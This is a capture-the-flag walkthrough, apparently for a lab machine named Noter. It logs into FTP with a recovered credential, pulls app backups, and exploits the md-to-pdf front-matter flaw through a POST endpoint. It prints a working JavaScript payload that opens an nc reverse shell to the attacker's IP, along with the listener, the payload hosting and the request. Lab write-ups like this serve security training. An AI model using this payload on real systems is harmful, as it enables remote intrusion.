## FTP Session as `ftp_admin`

Leverage this structure to login to the FTP server with the credential `ftp_admin`:`ftp_admin@Noter!`. It contains two timestamped application backup archives.

```bash
$ ftp 10.129.101.16
Connected to 10.129.101.16.
220 (vsFTPd 3.0.3)
Name (10.129.101.16:tgihf): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
```

The most recent application archive contains the most up-to-date source code of the  Noter web application. Going through the web application's endpoints, the `POST /export_note_remote` endpoints takes a `url`, retrieves the contents at that URL, and passes those contents to [md-to-pdf](https://www.npmjs.com/package/md-to-pdf) version 4.1.0. All versions of `md-to-pdf` before 5.0 contain a [remote command execution vulnerability](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) due to how [grey-matter](https://www.npmjs.com/package/gray-matter) processes the input. By hosting a payload and invoking the `POST /export_note_remote` endpoint as `blue` with the URL of the payload, it is possible to execute arbitrary commands on the target.

The payload (`blah.md`):

```md
---js\n((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.17 9000 >/tmp/f"))\n---RCE
```

Host the payload.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start a reverse shell listener.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
```

Invoke the endpoint.

```http
POST /export_note_remote HTTP/1.1
Host: 10.129.101.16:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.129.101.16:5000
Connection: close
Referer: http://10.129.101.16:5000/export_note_remote
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YpzKmQ.iPgrsXoX0hHoH8o85NZpzbw_L6k
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F10.10.14.17%2Fblah.md
```

Receive the reverse shell as `svc`. Grab the user flag from `/home/svc/user.txt`.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.101.16] 46342
bash: cannot set terminal process group (1248): Inappropriate ioctl for device
bash: no job control in this shell
svc@noter:~/app/web$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@noter:~/app/web$ ls -la /home/svc/user.txt
-rw-r----- 1 svc svc 33 Jun  5 13:47 /home/svc/user.txt
```
